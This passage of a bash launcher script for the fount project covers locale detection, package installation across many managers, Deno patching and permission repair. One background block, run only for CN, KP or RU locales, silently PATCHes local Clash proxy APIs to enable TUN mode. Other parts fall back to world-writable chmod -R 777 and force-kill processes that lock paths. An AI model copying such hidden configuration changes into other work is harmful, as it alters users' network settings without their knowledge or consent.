#!/usr/bin/env bash

# BSD date（macOS）不支持 %3N（毫秒），会原样输出；降级到秒精度
_fount_timestamp() {
	local t
	t=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ" 2>/dev/null)
	case "$t" in *%3N*) date -u +"%Y-%m-%dT%H:%M:%SZ" ;; *) printf '%s' "$t" ;; esac
}
FOUNT_SESSION_START_TIME=$(_fount_timestamp)
export FOUNT_SESSION_START_TIME
if [ -z "$FOUNT_START_TIME" ]; then
	FOUNT_START_TIME=$(_fount_timestamp)
fi
export FOUNT_START_TIME

# fount脚本需要兼容mac的上古版本bash，尽量避免使用新版本语法

# 官方npm源，避免用户自定义源导致各种问题
if [ -z "$NPM_CONFIG_REGISTRY" ]; then
	NPM_CONFIG_REGISTRY="https://registry.npmjs.org"
	export NPM_CONFIG_REGISTRY
fi

# --- 彩色输出定义 ---
C_RESET='\033[0m'
C_RED='\033[0;31m'
C_GREEN='\033[0;32m'
C_YELLOW='\033[0;33m'

# 在顶层检测一次ANSI支持并导出，确保子shell（命令替换）中也能正确读取
FOUNT_CONSOLE_ANSI=0
[ -t 1 ] && FOUNT_CONSOLE_ANSI=1
export FOUNT_CONSOLE_ANSI

# --- 国际化函数 ---
# 获取系统区域设置
get_system_locales() {
	local locales=()
	if [ -n "$LANG" ]; then locales+=("$(echo "$LANG" | cut -d. -f1 | sed 's/_/-/')"); fi
	if [ -n "$LANGUAGE" ]; then
		IFS=':' read -r -a lang_array <<<"$LANGUAGE"
		for lang in "${lang_array[@]}"; do
			locales+=("$(echo "$lang" | cut -d. -f1 | sed 's/_/-/')")
		done
	fi
	if [ -n "$LC_ALL" ]; then locales+=("$(echo "$LC_ALL" | cut -d. -f1 | sed 's/_/-/')"); fi
	if command -v locale >/dev/null; then
		locales+=("$(locale -uU 2>/dev/null | cut -d. -f1 | sed 's/_/-/')")
	fi
	locales+=("en-UK") # 备用
	# 去重
	# shellcheck disable=SC2207
	locales=($(printf "%s\n" "${locales[@]}" | awk '!x[$0]++'))
	echo "${locales[@]}"
}

# 从 src/public/locales/list.csv 获取可用区域设置
get_available_locales() {
	local locale_list_file="$FOUNT_DIR/src/public/locales/list.csv"
	if [ -f "$locale_list_file" ]; then
		# 跳过标题并获取第一列
		tail -n +2 "$locale_list_file" | cut -d, -f1
	else
		echo "en-UK" # 备用
	fi
}

# 寻找最合适的区域设置
get_best_locale() {
	local preferred_locales_str="$1"
	local available_locales_str="$2"
	# shellcheck disable=SC2206
	local preferred_locales=($preferred_locales_str)
	# shellcheck disable=SC2206
	local available_locales=($available_locales_str)

	for preferred in "${preferred_locales[@]}"; do
		for available in "${available_locales[@]}"; do
			if [ "$preferred" = "$available" ]; then
				echo "$preferred"
				return
			fi
		done
	done

	for preferred in "${preferred_locales[@]}"; do
		local prefix
		prefix=$(echo "$preferred" | cut -d- -f1)
		for available in "${available_locales[@]}"; do
			if [[ "$available" == "$prefix"* ]]; then
				echo "$available"
				return
			fi
		done
	done

	echo "en-UK" # 默认
}

# 加载本地化数据
# shellcheck disable=SC2120
load_locale_data() {
	if [ -z "$FOUNT_LOCALE" ]; then
		local system_locales
		system_locales=$(get_system_locales)
		local available_locales
		available_locales=$(get_available_locales)
		FOUNT_LOCALE=$(get_best_locale "$system_locales" "$available_locales")
		export FOUNT_LOCALE
	fi
	local locale_file="$FOUNT_DIR/src/public/locales/$FOUNT_LOCALE.json"
	if [ ! -f "$locale_file" ]; then
		FOUNT_LOCALE="en-UK"
		export FOUNT_LOCALE
		locale_file="$FOUNT_DIR/src/public/locales/en-UK.json"
	fi
	# 检查 jq
	if ! command -v jq &>/dev/null; then
		# 如果 install_package 存在，则使用它，否则我们无能为力
		if command -v install_package &>/dev/null; then
			install_package "jq" "jq" >&2
		fi
	fi
	if command -v jq &>/dev/null; then
		cat "$locale_file"
	else
		echo "{}" # 如果 jq 不可用，则返回空 json
	fi
}

# 获取翻译后的字符串
i18n_supports_ansi() { [ "${FOUNT_CONSOLE_ANSI:-0}" = "1" ]; }

i18n_format_param_value() {
	local param_name="$1"
	local param_value="$2"
	if i18n_supports_ansi; then
		case "$param_name" in
		path)   printf '\033[36m%s\033[0m' "$param_value" ; return ;;
		ref)    printf '\033[34m%s\033[0m' "$param_value" ; return ;;
		branch) printf '\033[33m%s\033[0m' "$param_value" ; return ;;
		esac
	fi
	printf '%s' "$param_value"
}

i18n_format_backtick_inner() {
	local inner="$1"
	if ! i18n_supports_ansi; then
		printf '%s' "$inner"
		return
	fi
	case "$inner" in
	# URLs / protocols
	*://*)
		printf '\033[34m%s\033[0m' "$inner" ;;
	# Git remotes
	origin | origin/* | upstream | upstream/*)
		printf '\033[34m%s\033[0m' "$inner" ;;
	# Git branches
	master | main | HEAD | develop)
		printf '\033[33m%s\033[0m' "$inner" ;;
	# Dotfiles / config filenames
	.*)
		printf '\033[36m%s\033[0m' "$inner" ;;
	# Commands with subcommands
	git\ * | fount\ * | deno\ * | winget\ * | pwsh\ * | patchelf\ * | osacompile\ * | lsregister\ * | chmod\ *)
		local cmd="${inner%% *}"
		local rest="${inner#"$cmd "}"
		printf '\033[35m%s\033[0m \033[33m%s\033[0m' "$cmd" "$rest" ;;
	# Known single commands
	git | fount | deno | winget | pwsh | patchelf | osacompile | lsregister | chmod)
		printf '\033[35m%s\033[0m' "$inner" ;;
	*)
		# All-uppercase identifiers → env vars (e.g. PATH)
		local _upper
		_upper=$(printf '%s' "$inner" | tr '[:lower:]' '[:upper:]')
		if [ "$inner" = "$_upper" ] && [ "${#inner}" -ge 2 ]; then
			printf '\033[36m%s\033[0m' "$inner"
			return
		fi
		# Dot-notation config keys (e.g. safe.directory)
		case "$inner" in
		*.*)
			if printf '%s' "$inner" | grep -qE '^[a-z][a-z0-9_-]*(\.[a-z][a-z0-9_-]*)+$'; then
				printf '\033[36m%s\033[0m' "$inner"
				return
			fi ;;
		esac
		# Default: code / command identifier
		printf '\033[35m%s\033[0m' "$inner" ;;
	esac
}

apply_i18n_backticks() {
	local rest="$1" before inner
	while [ -n "$rest" ]; do
		case "$rest" in
		*\`*)
			before="${rest%%\`*}"
			rest="${rest#*\`}"
			case "$rest" in
			*\`*)
				inner="${rest%%\`*}"
				rest="${rest#*\`}"
				printf '%s' "$before"
				i18n_format_backtick_inner "$inner"
				;;
			*)
				printf '%s`%s' "$before" "$rest"
				rest=""
				;;
			esac
			;;
		*)
			printf '%s' "$rest"
			rest=""
			;;
		esac
	done
}

get_i18n() {
	local key="$1"
	if [ -z "$FOUNT_LOCALE_DATA" ]; then
		FOUNT_LOCALE_DATA=$(load_locale_data)
		export FOUNT_LOCALE_DATA
	fi
	local translation
	translation=$(echo "$FOUNT_LOCALE_DATA" | jq -r ".fountConsole.path.$key // .\"$key\" // \"$key\"")

	shift
	while [ $# -gt 0 ]; do
		local param_name="$1"
		local param_value="$2"
		local formatted_value placeholder backtick_placeholder
		formatted_value=$(i18n_format_param_value "$param_name" "$param_value")
		placeholder="\${${param_name}}"
		backtick_placeholder="\`\${${param_name}}\`"
		translation=${translation//"${backtick_placeholder}"/"${formatted_value}"}
		translation=${translation//"${placeholder}"/"${formatted_value}"}
		shift 2
	done
	apply_i18n_backticks "$translation"
	printf '\n'
}

# 以指定外层颜色输出 i18n 消息，确保内部 ANSI 重置后能正确恢复外层颜色
print_i18n() {
	local color=""
	if [ "$1" = "--color" ]; then
		color="$2"; shift 2
	fi
	if ! i18n_supports_ansi || [ -z "$color" ]; then
		get_i18n "$@"
		return
	fi
	local rst col text
	rst=$(printf '\033[0m')
	col=$(printf '\033[%sm' "$color")
	text=$(get_i18n "$@")
	# 每个内部重置后恢复外层颜色，避免颜色被截断
	text="${text//"${rst}"/"${rst}${col}"}"
	printf '%s%s%s\n' "$col" "$text" "$rst"
}
print_i18n_red()    { print_i18n --color "0;31" "$@"; }
print_i18n_yellow() { print_i18n --color "0;33" "$@"; }
print_i18n_green()  { print_i18n --color "0;32" "$@"; }

# 检测是否在系统临时目录中运行
is_in_temp_dir() {
	local dir="$1"
	local resolved
	resolved=$(cd "$dir" 2>/dev/null && pwd -P) || resolved="$dir"

	case "$resolved" in
	/var/folders/*) return 0 ;;
	esac

	local tmp_candidate resolved_tmp
	for tmp_candidate in "${TMPDIR:-}" /tmp /var/tmp /private/tmp; do
		[ -n "$tmp_candidate" ] || continue
		resolved_tmp=$(cd "$tmp_candidate" 2>/dev/null && pwd -P) || resolved_tmp="$tmp_candidate"
		case "$resolved" in
		"$resolved_tmp" | "$resolved_tmp"/*) return 0 ;;
		esac
	done
	return 1
}

# 定义常量和路径
SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &>/dev/null && pwd)
FOUNT_DIR=$(dirname "$SCRIPT_DIR")

if [ "${1:-}" != "remove" ] && is_in_temp_dir "$FOUNT_DIR"; then
	get_i18n 'tempDir.blocked' >&2
	exit 1
fi

# 若是 Windows 环境，则使用 fount.ps1
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "cygwin" ]]; then
	powershell.exe -noprofile -executionpolicy bypass -file "$FOUNT_DIR\path\fount.ps1" "$@"
	exit $?
fi

# 转义后的fount路径用于sed
ESCAPED_FOUNT_DIR=$(echo "$FOUNT_DIR" | sed 's/\//\\\//g')

# 任务栏进度
taskbar_progress_enabled() { [ -t 1 ]; }
write_taskbar_progress() {
	if ! taskbar_progress_enabled; then return; fi
	if [ -n "${1:-}" ]; then
		printf "\033]9;4;1;%s\007" "$1"
	else
		printf "\033]9;4;3\007"
	fi
}
write_taskbar_progress_clear() { taskbar_progress_enabled && printf "\033]9;4;0\007"; }
write_taskbar_progress_error() { taskbar_progress_enabled && printf "\033]9;4;2;100\007"; }

# 终端窗口标题
set_title() {
	[ -c /dev/tty ] || return
	printf '\033]0;%s\007' "$1" >/dev/tty 2>/dev/null || true
}
get_title() {
	[ -c /dev/tty ] || {
		echo ""
		return
	}
	(
		set +e
		ss=$(stty -g </dev/tty 2>/dev/null) || {
			echo ""
			exit 0
		}
		trap 'stty "$ss" </dev/tty 2>/dev/null' EXIT
		e=$(printf '\033')
		st=$(printf '\234')
		t=
		stty -echo -icanon min 0 time "${2:-2}" </dev/tty 2>/dev/null || {
			echo ""
			exit 0
		}
		printf '\033[21t' >/dev/tty 2>/dev/null || {
			echo ""
			exit 0
		}
		while true; do
			c=$(dd bs=1 count=1 2>/dev/null </dev/tty) || break
			[ -n "$c" ] || break
			t="$t$c"
			case "$t" in
			$e*$e\\ | $e*$st)
				t=${t%"$e"\\}
				t=${t%"$st"}
				printf '%s\n' "${t#"$e"\][lL]}"
				exit 0
				;;
			$e*) ;;
			*) break ;;
			esac
		done
		echo ""
		exit 1
	) 2>/dev/null
}

# 自动安装包列表文件及标记文件
INSTALLER_DATA_DIR="$FOUNT_DIR/data/installer"
INSTALLED_SYSTEM_PACKAGES_FILE="$INSTALLER_DATA_DIR/auto_installed_system_packages"
INSTALLED_PACMAN_PACKAGES_FILE="$INSTALLER_DATA_DIR/auto_installed_pacman_packages"
AUTO_INSTALLED_DENO_FLAG="$INSTALLER_DATA_DIR/auto_installed_deno"

# 初始化已安装的包列表 (数组形式)
INSTALLED_SYSTEM_PACKAGES_ARRAY=()
INSTALLED_PACMAN_PACKAGES_ARRAY=()

# 载入之前自动安装的包列表
load_installed_packages() {
	mkdir -p "$INSTALLER_DATA_DIR"
	if [[ -f "$INSTALLED_SYSTEM_PACKAGES_FILE" ]]; then
		IFS=';' read -r -a INSTALLED_SYSTEM_PACKAGES_ARRAY <<<"$(tr -d '\n' <"$INSTALLED_SYSTEM_PACKAGES_FILE")"
	fi
	if [[ -f "$INSTALLED_PACMAN_PACKAGES_FILE" ]]; then
		IFS=';' read -r -a INSTALLED_PACMAN_PACKAGES_ARRAY <<<"$(tr -d '\n' <"$INSTALLED_PACMAN_PACKAGES_FILE")"
	fi
	if [[ -n "$FOUNT_AUTO_INSTALLED_PACKAGES" ]]; then
		IFS=';' read -r -a FOUNT_AUTO_INSTALLED_PACKAGES_ARRAY <<<"$FOUNT_AUTO_INSTALLED_PACKAGES"
		INSTALLED_SYSTEM_PACKAGES_ARRAY+=("${FOUNT_AUTO_INSTALLED_PACKAGES_ARRAY[@]}")
		# shellcheck disable=SC2207
		INSTALLED_SYSTEM_PACKAGES_ARRAY=($(echo "${INSTALLED_SYSTEM_PACKAGES_ARRAY[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
		(
			IFS=';'
			echo "${INSTALLED_SYSTEM_PACKAGES_ARRAY[*]}"
		) >"$INSTALLED_SYSTEM_PACKAGES_FILE"
	fi
}

# 保存已安装的包列表
save_installed_packages() {
	mkdir -p "$INSTALLER_DATA_DIR"
	(
		IFS=';'
		echo "${INSTALLED_SYSTEM_PACKAGES_ARRAY[*]}"
	) >"$INSTALLED_SYSTEM_PACKAGES_FILE"
	if [[ $IN_TERMUX -eq 1 ]]; then
		(
			IFS=';'
			echo "${INSTALLED_PACMAN_PACKAGES_ARRAY[*]}"
		) >"$INSTALLED_PACMAN_PACKAGES_FILE"
	fi
}

if echo "${LANG:-}" | grep -iqE "_(CN|KP|RU)"; then
(
	TARGETS="github.com cdn.jsdelivr.net"
	# 随手之劳之经验医学之clash的tun没开
	for host in $TARGETS; do
		if ! ping -c 1 -W 2 "$host" >/dev/null 2>&1; then
			curl -X PATCH "http://127.0.0.1:9090/configs" \
				-d '{"tun":{"enable":true}}' \
				-s -o /dev/null --max-time 3
			curl -X PATCH "http://127.0.0.1:9097/configs" \
				-d '{"tun":{"enable":true}}' \
				-s -o /dev/null --max-time 3
			break
		fi
	done
) >/dev/null 2>&1 &
fi

# 首次载入
load_installed_packages

# 检测环境
IN_DOCKER=0
if [ -f "/.dockerenv" ] || grep -q 'docker\|containerd' /proc/1/cgroup 2>/dev/null; then
	IN_DOCKER=1
fi
IN_TERMUX=0
if [[ -d "/data/data/com.termux" ]]; then
	IN_TERMUX=1
fi
OS_TYPE=$(uname -s)

# 辅助函数: 跨平台原地修改文件 (sed -i)
run_sed_inplace() {
	local expression="$1"
	local file="$2"
	if [ "$OS_TYPE" = "Darwin" ]; then
		sed -i '' "$expression" "$file"
	else
		sed -i "$expression" "$file"
	fi
}

# 函数: 将包添加到跟踪列表并保存
add_package_to_tracker() {
	local package="$1"
	local array_name="$2"
	local array_ref="${array_name}[@]"
	local found=0
	for p in "${!array_ref}"; do
		if [[ "$p" == "$package" ]]; then
			found=1
			break
		fi
	done

	if [[ $found -eq 0 ]]; then
		eval "${array_name}+=(\"$package\")"
		save_installed_packages
	fi
}

# 辅助函数: 智能地使用包管理器进行安装 (包含更新逻辑)
install_with_manager() {
	local manager_cmd="$1"
	local package_to_install="$2"
	local update_args=""
	local install_args=""
	local has_sudo=""

	if ! command -v "$manager_cmd" &>/dev/null; then
		return 1
	fi

	if [[ $(id -u) -ne 0 ]] && command -v sudo &>/dev/null; then
		has_sudo="sudo"
	fi

	case "$manager_cmd" in
	"apt-get")
		update_args="update -y"
		install_args="install -y"
		;;
	"pacman")
		update_args="-Syy --noconfirm"
		install_args="-S --needed --noconfirm"
		;;
	"dnf")
		update_args="makecache"
		install_args="install -y"
		;;
	"yum")
		update_args="makecache fast"
		install_args="install -y"
		;;
	"zypper")
		update_args="refresh"
		install_args="install -y --no-confirm"
		;;
	"pkg")
		update_args="update -y"
		install_args="install -y"
		;;
	"apk")
		install_args="add --update"
		;;
	"brew" | "snap")
		if [[ "$manager_cmd" == "snap" ]]; then
			if ! command -v sudo &>/dev/null; then return 1; fi
			has_sudo="sudo"
			install_args="install"
		else
			has_sudo=""
			install_args="install"
		fi
		;;
	*)
		return 1
		;;
	esac

	if [[ -n "$update_args" ]]; then
		# shellcheck disable=SC2086
		$has_sudo "$manager_cmd" $update_args
	fi

	# shellcheck disable=SC2086
	if $has_sudo "$manager_cmd" $install_args "$package_to_install"; then
		return 0
	fi

	return 1
}

# 函数: 安装包
install_package() {
	local command_name="$1"
	# 如果第二个参数为空，则默认为命令名
	local package_list_str="${2:-$command_name}"
	# shellcheck disable=SC2206
	local package_list=($package_list_str)

	if command -v "$command_name" &>/dev/null; then
		return 0
	fi

	for package in "${package_list[@]}"; do
		# 尝试所有包管理器，但一次只尝试一个包
		if
			install_with_manager "pkg" "$package" ||
				install_with_manager "apt-get" "$package" ||
				install_with_manager "pacman" "$package" ||
				install_with_manager "dnf" "$package" ||
				install_with_manager "yum" "$package" ||
				install_with_manager "zypper" "$package" ||
				install_with_manager "apk" "$package" ||
				install_with_manager "brew" "$package" ||
				install_with_manager "snap" "$package"
		then
			# 只要有一个包管理器成功安装，就检查命令是否可用
			if command -v "$command_name" &>/dev/null; then
				add_package_to_tracker "$package" "INSTALLED_SYSTEM_PACKAGES_ARRAY"
				return 0
			fi
		fi
	done

	echo -e "${C_RED}Error: $command_name installation failed.${C_RESET}" >&2
	return 1
}

# 辅助函数: 智能地使用包管理器进行更新
upgrade_with_manager() {
	local manager_cmd="$1"
	local package_to_upgrade="$2"
	local update_args=""
	local upgrade_args=""
	local has_sudo=""

	if ! command -v "$manager_cmd" &>/dev/null; then
		return 1
	fi

	if [[ $(id -u) -ne 0 ]] && command -v sudo &>/dev/null; then
		has_sudo="sudo"
	fi

	case "$manager_cmd" in
	"apt-get")
		update_args="update -y"
		upgrade_args="install --only-upgrade -y"
		;;
	"pacman")
		update_args="-Sy --noconfirm"
		upgrade_args="-S --noconfirm"
		;;
	"dnf")
		update_args="makecache"
		upgrade_args="update -y"
		;;
	"yum")
		update_args="makecache fast"
		upgrade_args="update -y"
		;;
	"zypper")
		update_args="refresh"
		upgrade_args="update -y --no-confirm"
		;;
	"pkg")
		update_args="update -y"
		upgrade_args="upgrade -y"
		;;
	"apk")
		update_args="update"
		upgrade_args="upgrade"
		;;
	"brew")
		has_sudo=""
		upgrade_args="upgrade"
		;;
	"snap")
		if ! command -v sudo &>/dev/null; then return 1; fi
		has_sudo="sudo"
		upgrade_args="refresh"
		;;
	*)
		return 1
		;;
	esac

	if [[ -n "$update_args" ]]; then
		# shellcheck disable=SC2086
		$has_sudo "$manager_cmd" $update_args >/dev/null 2>&1 || true
	fi

	# shellcheck disable=SC2086
	if $has_sudo "$manager_cmd" $upgrade_args "$package_to_upgrade" >/dev/null 2>&1; then
		return 0
	fi

	return 1
}

# 函数: 更新包
upgrade_package() {
	local command_name="$1"
	# 如果第二个参数为空，则默认为命令名
	local package_list_str="${2:-$command_name}"
	# shellcheck disable=SC2206
	local package_list=($package_list_str)

	for package in "${package_list[@]}"; do
		# 尝试所有包管理器，但一次只尝试一个包
		if
			upgrade_with_manager "pkg" "$package" ||
				upgrade_with_manager "apt-get" "$package" ||
				upgrade_with_manager "pacman" "$package" ||
				upgrade_with_manager "dnf" "$package" ||
				upgrade_with_manager "yum" "$package" ||
				upgrade_with_manager "zypper" "$package" ||
				upgrade_with_manager "apk" "$package" ||
				upgrade_with_manager "brew" "$package" ||
				upgrade_with_manager "snap" "$package"
		then
			# 只要有一个包管理器成功更新，就检查命令是否仍然可用
			if command -v "$command_name" &>/dev/null; then
				return 0
			fi
		fi
	done

	return 1
}

# 函数: 卸载包
uninstall_package() {
	local package_name="$1"
	local has_sudo=""
	if [[ $(id -u) -ne 0 ]] && command -v sudo &>/dev/null; then has_sudo="sudo"; fi

	# 尝试每个包管理器，成功后立即返回
	if command -v apt-get &>/dev/null && $has_sudo apt-get purge -y "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v pacman &>/dev/null && $has_sudo pacman -Rns --noconfirm "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v dnf &>/dev/null && $has_sudo dnf remove -y "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v yum &>/dev/null && $has_sudo yum remove -y "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v zypper &>/dev/null && $has_sudo zypper remove -y --no-confirm "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v apk &>/dev/null && $has_sudo apk del "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v brew &>/dev/null && brew uninstall "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v snap &>/dev/null && $has_sudo snap remove "$package_name" &>/dev/null; then
		return 0
	fi
	if command -v pkg &>/dev/null && pkg uninstall -y "$package_name" &>/dev/null; then
		return 0
	fi

	echo -e "${C_YELLOW}Failed to remove ${package_name}. It might not be installed or managed by a recognized package manager.${C_RESET}" >&2
	return 1
}

test_browser() {
	local run_as_user=""
	local user_home=$HOME

	if [ "$(id -u)" -eq 0 ] && [ -n "$SUDO_USER" ]; then
		user_home=$(eval echo "~$SUDO_USER")
		run_as_user="env HOME=$user_home sudo -u $SUDO_USER"
	fi

	if [ "$OS_TYPE" = "Linux" ]; then
		if command -v update-alternatives &>/dev/null; then
			local system_browser
			system_browser=$(update-alternatives --query x-www-browser | grep -o '/.*' | head -n1)
			if [ -n "$system_browser" ]; then
				return 1
			fi
		fi
		install_package "xdg-settings" "xdg-utils"
		if command -v xdg-settings &>/dev/null; then
			local default_browser_desktop
			default_browser_desktop=$($run_as_user xdg-settings get default-web-browser 2>/dev/null)
			if [[ -n "$default_browser_desktop" && "$default_browser_desktop" == *".desktop"* ]]; then
				return 1
			fi
		fi
	elif [ "$OS_TYPE" = "Darwin" ]; then
		# 尝试使用 defaults read
		local default_browser_bundle_id
		default_browser_bundle_id=$($run_as_user defaults read "${user_home}"/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist 2>/dev/null | grep -B 1 "LSHandlerURLScheme = https;" | sed -n -e 's/^.*RoleAll = "//' -e 's/";//p' | head -n 1) || true
		if [ -n "$default_browser_bundle_id" ]; then
			return 1
		fi
	fi

	get_i18n 'install.browserMissing'
	install_package "google-chrome" "google-chrome google-chrome-stable"
	if ! command -v google-chrome &>/dev/null; then
		install_package "chromium-browser" "chromium-browser chromium"
	fi
	return 0
}

# 函数: 运行 Deno，考虑 glibc-runner 如果可用
run_deno() {
	local deno_args=("$@")
	local deno_cmd="deno"

	if [[ $IN_TERMUX -eq 1 ]]; then
		if command -v deno.glibc.sh &>/dev/null; then
			deno_cmd="deno.glibc.sh"
		elif command -v glibc-runner &>/dev/null; then
			deno_cmd="glibc-runner $(command -v deno)"
		fi
	fi
	command "$deno_cmd" "${deno_args[@]}"
}

# 函数: 为 Termux 打补丁 Deno 可执行文件
patch_deno() {
	local deno_bin
	deno_bin=$(command -v deno)

	if [[ -z "$deno_bin" ]]; then
		print_i18n_red 'deno.patchMissing' >&2
		return 1
	fi

	install_package "patchelf" "patchelf" || return 1

	local interp_path
	local arch
	arch=$(uname -m)

	if [[ -z "$PREFIX" ]]; then
		PREFIX="/data/data/com.termux/files/usr"
	fi

	case "$arch" in
	"aarch64")
		interp_path="${PREFIX}/glibc/lib/ld-linux-aarch64.so.1"
		;;
	"x86_64")
		interp_path="${PREFIX}/glibc/lib/ld-linux-x86-64.so.2"
		;;
	"i686")
		interp_path="${PREFIX}/glibc/lib/ld-linux.so.2"
		;;
	*)
		print_i18n_red 'deno.patchUnsupportedArch' 'arch' "$arch" >&2
		return 1
		;;
	esac

	if ! patchelf --set-rpath "${ORIGIN}/../glibc/lib" --set-interpreter "$interp_path" "$deno_bin"; then
		print_i18n_red 'deno.patchFailed' >&2
		return 1
	else
		mkdir -p ~/.deno/bin
		cat >~/.deno/bin/deno.glibc.sh <<'EOF'
#!/usr/bin/env sh
_oldpwd="${PWD}"
_dir="$(dirname "${0}")"
cd "${_dir}"
if ! [ -h "deno" ] ; then
	mv -f "deno" "deno.orig"
	ln -sf "deno.glibc.sh" "deno"
fi
cd "${_oldpwd}"
LD_PRELOAD= exec "${_dir}/deno.orig" "${@}"
EOF
		chmod u+x ~/.deno/bin/deno.glibc.sh
	fi
	return 0
}

# 函数: URL 编码
urlencode() {
	local string="$1"
	local strlen=${#string}
	local encoded=""
	local pos c o

	for ((pos = 0; pos < strlen; pos++)); do
		c="${string:$pos:1}"
		case "$c" in
		[-_.~a-zA-Z0-9]) o="${c}" ;;
		*) printf -v o '%%%02X' "'$c" ;;
		esac
		encoded+="${o}"
	done
	echo "${encoded}"
}

handle_docker_termux_passthrough() {
	if [[ $IN_DOCKER -eq 1 || $IN_TERMUX -eq 1 ]]; then
		shift # Remove the command itself (e.g., "open")
		"$0" "$@"
		exit $?
	fi
}

check_dir_writable() {
	local dir="$1"
	if [ ! -d "$dir" ]; then
		mkdir -p "$dir" 2>/dev/null || return 1
	fi
	[ -w "$dir" ]
}

assert_fount_dir_writable() {
	local dir="$1"
	if ! check_dir_writable "$dir"; then
		if [ "$(id -u)" -eq 0 ]; then
			print_i18n_red 'install.permissionDeniedAsRoot' 'path' "$dir" >&2
		else
			print_i18n_red 'install.permissionDeniedNotRoot' 'path' "$dir" >&2
		fi
		exit 1
	fi
}

get_init_force_target_user() {
	if [ -n "${SUDO_USER:-}" ]; then
		echo "$SUDO_USER"
	elif [ -n "${USER:-}" ] && [ "$(id -un 2>/dev/null)" = "root" ] && [ "$USER" != "root" ]; then
		echo "$USER"
	else
		logname 2>/dev/null || id -un
	fi
}

get_init_force_target_login_shell() {
	local target_user="$1" shell=""
	if [ "$OS_TYPE" = "Darwin" ] && command -v dscl &>/dev/null; then
		shell=$(dscl . -read "/Users/$target_user" UserShell 2>/dev/null | awk '{print $2}')
	elif command -v getent &>/dev/null; then
		shell=$(getent passwd "$target_user" 2>/dev/null | cut -d: -f7-)
	fi
	if [ -z "$shell" ] || [ ! -x "$shell" ]; then
		shell="/bin/sh"
	fi
	printf '%s' "$shell"
}

dedupe_paths_drop_children() {
	local -a kept=() p q pl ql skip
	for p in "$@"; do
		skip=0
		pl="${p%/}/"
		for q in "$@"; do
			[ "$p" = "$q" ] && continue
			ql="${q%/}/"
			case "$pl" in
			"$ql"*) skip=1; break ;;
			esac
		done
		[ "$skip" -eq 0 ] && kept+=("$p")
	done
	printf '%s\n' "${kept[@]}"
}

get_deno_dirs_for_init_force() {
	local target_user="$1" user_home="$2"
	local -a dirs=() unique_dirs=() path info login_shell rp
	login_shell=$(get_init_force_target_login_shell "$target_user")
	if [ -x "$user_home/.deno/bin/deno" ]; then
		info=$(sudo -u "$target_user" env HOME="$user_home" "$login_shell" -lc '"$HOME/.deno/bin/deno" info --json' 2>/dev/null) || true
	else
		info=$(sudo -u "$target_user" env HOME="$user_home" "$login_shell" -lc 'deno info --json' 2>/dev/null) || true
	fi
	if [ -n "$info" ]; then
		install_package "jq" "jq" || true
		if command -v jq &>/dev/null; then
			while IFS= read -r path; do
				[ -n "$path" ] || continue
				[ -e "$path" ] || continue
				if [ -d "$path" ]; then
					rp=$(cd -P "$path" && pwd -P)
				else
					rp="$path"
				fi
				[ -n "$rp" ] && dirs+=("$rp")
			done < <(printf '%s' "$info" | jq -r 'try (.[] | strings | select(test("^/"))) catch empty' 2>/dev/null)
		fi
	fi
	for path in \
		"$user_home/.deno" \
		"$user_home/.cache/deno" \
		"$user_home/Library/Caches/deno"; do
		[ -e "$path" ] && dirs+=("$path")
	done
	if [ "${#dirs[@]}" -eq 0 ]; then
		return 0
	fi
	while IFS= read -r path; do
		[ -n "$path" ] && unique_dirs+=("$path")
	done < <(printf '%s\n' "${dirs[@]}" | awk '!x[$0]++')
	dedupe_paths_drop_children "${unique_dirs[@]}"
}

stop_locking_process_for_path() {
	local path="$1" pid
	[ -e "$path" ] || return 0
	if command -v lsof &>/dev/null; then
		for pid in $(lsof -t "$path" 2>/dev/null); do
			kill "$pid" 2>/dev/null || true
		done
		sleep 1
		for pid in $(lsof -t "$path" 2>/dev/null); do
			kill -9 "$pid" 2>/dev/null || true
		done
	fi
	if command -v fuser &>/dev/null; then
		fuser -km "$path" 2>/dev/null || true
		sleep 1
	fi
}

clear_init_force_tree_acls() {
	local path="$1"
	[ -e "$path" ] || return 0
	if [ "$OS_TYPE" = "Darwin" ]; then
		chmod -RN "$path" 2>/dev/null || true
	elif [ "$OS_TYPE" = "Linux" ] && command -v setfacl &>/dev/null; then
		setfacl -b -R "$path" 2>/dev/null || true
	fi
}

fix_init_force_tree_permissions() {
	local path="$1"
	[ -e "$path" ] || return 0
	stop_locking_process_for_path "$path"
	clear_init_force_tree_acls "$path"
	chmod -R a+rwX "$path" 2>/dev/null || chmod -R 777 "$path" 2>/dev/null || true
}

path_is_under_home() {
	local home="$1" path="$2"
	home="${home%/}"
	path="${path%/}"
	case "$path" in
	"$home" | "$home"/*) return 0 ;;
	esac
	return 1
}

restore_init_force_tree_ownership() {
	local target_user="$1" target_home="$2" path="$3" fount_dir="$4"
	local path_norm fount_norm
	[ -e "$path" ] || return 0
	path_norm="${path%/}"
	fount_norm="${fount_dir%/}"
	if path_is_under_home "$target_home" "$path" || [ "$path_norm" = "$fount_norm" ]; then
		chown -R "$target_user:" "$path" 2>/dev/null || true
	fi
	clear_init_force_tree_acls "$path"
	chmod -R u+rwX,go+rX "$path" 2>/dev/null || true
}

get_init_force_target_path() {
	local target_user="$1" target_home="$2"
	local target_path login_shell
	if [ -n "${FOUNT_INIT_FORCE_CACHED_PATH:-}" ]; then
		target_path="$FOUNT_INIT_FORCE_CACHED_PATH"
	else
		login_shell=$(get_init_force_target_login_shell "$target_user")
		target_path=$(sudo -u "$target_user" env HOME="$target_home" "$login_shell" -lc 'printf %s "$PATH"' 2>/dev/null || true)
	fi
	if [ -z "$target_path" ]; then
		target_path="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
	fi
	case ":$target_path:" in
	*":$target_home/.deno/bin:"*) ;;
	*) target_path="$target_home/.deno/bin:$target_path" ;;
	esac
	printf '%s' "$target_path"
}

invoke_fount_init_force() {
	local target_user target_home target_path path init_exit=0
	local -a paths=() deno_dirs=()
	target_user=$(get_init_force_target_user)
	target_home=$(eval echo "~$target_user")
